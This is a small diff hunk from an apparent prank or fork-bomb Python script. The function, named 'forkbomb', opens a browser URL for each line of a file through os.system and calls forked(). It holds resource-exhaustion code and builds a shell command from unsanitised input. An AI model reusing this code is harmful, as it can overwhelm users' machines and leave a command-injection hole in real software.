@@ -7,4 +7,4 @@ def forkbomb():
   content = file.readlines()
   for line in content:
     os.system("xdg-open https://" + line)
-    forked()
+  forked()
